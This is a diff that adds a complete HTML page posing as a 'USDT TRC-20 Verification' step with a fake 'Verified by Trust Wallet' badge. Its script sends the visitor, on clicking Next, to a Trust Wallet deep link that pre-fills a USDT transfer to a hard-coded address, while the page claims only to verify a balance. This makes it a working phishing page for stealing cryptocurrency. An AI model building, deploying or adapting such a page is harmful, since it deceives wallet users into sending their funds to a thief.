@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT TRC-20 Verification</title>
+  <link rel="icon" href="favicon.ico" />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background-color: #ffffff;
+      color: #000000;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      padding: 24px;
+    }
+    .logo {
+      width: 80px;
+      margin: 20px auto;
+      display: block;
+    }
+    h2 {
+      text-align: center;
+      font-size: 20px;
+      margin-bottom: 8px;
+    }
+    .info {
+      text-align: center;
+      font-size: 14px;
+      color: #444;
+    }
+    .terms {
+      margin-top: 20px;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+    }
+    .terms input {
+      margin-right: 8px;
+    }
+    .verify-btn {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background-color: #007bff;
+      color: white;
+      padding: 18px;
+      font-size: 16px;
+      border: none;
+      cursor: pointer;
+      width: 100%;
+    }
+    .verify-btn:disabled {
+      background-color: #aaa;
+    }
+    .badge {
+      margin-top: 16px;
+      text-align: center;
+      font-size: 12px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="logo.png" alt="Logo" class="logo"/>
+    <h2>Please verify your asset</h2>
+    <p class="info">To continue, verify your USDT (TRC-20) balance.</p>
+
+    <div class="terms">
+      <input type="checkbox" id="agreeCheckbox" />
+      <label for="agreeCheckbox">I agree to the Terms & Conditions</label>
+    </div>
+
+    <div class="badge">✅ Verified by Trust Wallet</div>
+  </div>
+
+  <button class="verify-btn" id="nextBtn" disabled>Next</button>
+
+  <script>
+    const checkbox = document.getElementById('agreeCheckbox');
+    const nextBtn = document.getElementById('nextBtn');
+
+    checkbox.addEventListener('change', () => {
+      nextBtn.disabled = !checkbox.checked;
+    });
+
+    nextBtn.addEventListener('click', () => {
+      const trustWalletLink = "https://link.trustwallet.com/send?coin=195&address=TYfVDDuC234ADKFc5HRsSaeqLvgU8H1AEc&token_id=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+      window.location.href = trustWalletLink;
+    });
+  </script>
+</body>
+</html>
